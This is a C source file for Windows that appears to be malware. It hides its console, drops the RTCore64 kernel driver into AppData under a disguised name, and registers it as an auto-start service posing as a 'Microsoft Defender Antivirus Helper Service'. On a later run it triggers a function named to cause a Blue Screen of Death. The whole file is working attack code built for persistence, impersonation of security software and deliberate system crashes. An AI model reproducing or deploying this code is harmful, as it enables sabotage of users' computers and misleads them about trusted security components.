#include <stdio.h>
#include <Windows.h>

#include "rawdata.h"
#include "functions.h"

int main( void )
{
	ShowWindow( GetConsoleWindow(), SW_HIDE );

	SC_HANDLE hSCManager_read = OpenSCManagerA( NULL, NULL, GENERIC_READ );
	if ( hSCManager_read == NULL ) exit( 0 );

	char* user_directory = getenv( "USERPROFILE" );
	char RTCore64_directory[] = "\\AppData\\Roaming\\C-00000139.sys";

	char RTCore64_path[ MAX_PATH ];
	snprintf( RTCore64_path, sizeof( RTCore64_path ), "%s%s", user_directory, RTCore64_directory );

	const LPCSTR service_name = "WinDefendHelper";

	SC_HANDLE hService = OpenServiceA( hSCManager_read, service_name, SERVICE_QUERY_STATUS );
	if ( hService == NULL )
	{
		RTCore64DrvCreation( RTCore64_path );

		SC_HANDLE hSCManager_create = OpenSCManagerA( NULL, NULL, SC_MANAGER_CREATE_SERVICE );
		if ( hSCManager_create == NULL )
		{
			CloseServiceHandle( hSCManager_read );
			exit( 0 );
		}

		SC_HANDLE hService_edit = CreateServiceA( hSCManager_create, service_name,
			"Microsoft Defender Antivirus Helper Service", SERVICE_START, SERVICE_KERNEL_DRIVER,
			SERVICE_AUTO_START, SERVICE_ERROR_IGNORE, RTCore64_path, NULL, NULL, NULL, NULL, NULL );
		if ( hService == NULL )
		{
			CloseServiceHandle( hSCManager_create );
			CloseServiceHandle( hSCManager_read );
			exit( 0 );
		}

		CloseServiceHandle( hService_edit );
		CloseServiceHandle( hSCManager_create );
		CloseServiceHandle( hSCManager_read );
		exit( 0 );
	}

	CloseServiceHandle( hService );
	CloseServiceHandle( hSCManager_read );
	IOCTL_Blue_Screen_of_Death();
	exit( 0 );

	return 0;
}